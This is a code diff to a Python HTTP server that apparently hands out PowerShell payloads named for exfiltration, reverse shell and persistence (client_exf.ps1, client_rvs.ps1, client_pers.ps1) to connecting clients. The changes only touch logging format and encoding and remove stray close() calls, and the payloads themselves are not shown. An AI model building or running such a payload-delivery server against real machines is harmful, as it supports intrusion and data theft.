@@ -12,7 +12,7 @@ CURRENT_DIR = os.getcwd()
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def log_request(self, code):
         log('[+] New connection from [' + self.client_address[0] + ':' + str(self.client_address[1]) + ']',print_console=True,trace_time=True)
-        log(self.command  + ' ' + self.path + ' ' + self.request_version + '\r' + str(self.headers),print_console=True,trace_time=False)
+        log(self.command  + ' ' + self.path + ' ' + self.request_version + '\n' + str(self.headers),print_console=True,trace_time=False)
 
     def do_GET(self):
         headers = self.headers
@@ -30,8 +30,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.wfile.write(bytes(file_to_open, 'utf-8')+bytes(file_to_open2, 'utf-8'))
                 log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                 log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
-                file_to_open.close()
-                file_to_open2.close()
             except:
                 log('[-] Error while sending both files.',print_console=True,trace_time=True)
                 self.send_response(404)
@@ -46,7 +44,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(bytes(file_to_open, 'utf-8'))
                 log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
-                file_to_open.close()
             except:
                 log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
@@ -61,7 +58,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(bytes(file_to_open, 'utf-8'))
                 log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
-                file_to_open.close()
             except:
                 log('[-] File client_rvs.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
@@ -75,7 +71,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(bytes(file_to_open, 'utf-8'))
                 log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
-                file_to_open.close()
             except:
                 log('[-] File client_pers.ps1 does not exist.',print_console=True,trace_time=True)
                 self.send_response(404)
@@ -131,11 +126,11 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 def log(text,print_console=False,trace_time=True):
     current_datetime = datetime.now()
     current_date_time = current_datetime.strftime('%Y-%m-%d %H:%M:%S')
-    log_file = open(CURRENT_DIR + '/' + 'logs.txt','a',encoding='windows-1252')
+    log_file = open(CURRENT_DIR + '/' + 'logs.txt','a',encoding='utf-8')
     if trace_time:
-        log_file.write(current_date_time + "  " + text + '\r')
+        log_file.write(current_date_time + "  " + text + '\n')
     else:
-        log_file.write(text + '\r')
+        log_file.write(text + '\n')
     log_file.close()
     if print_console:
         print(text)
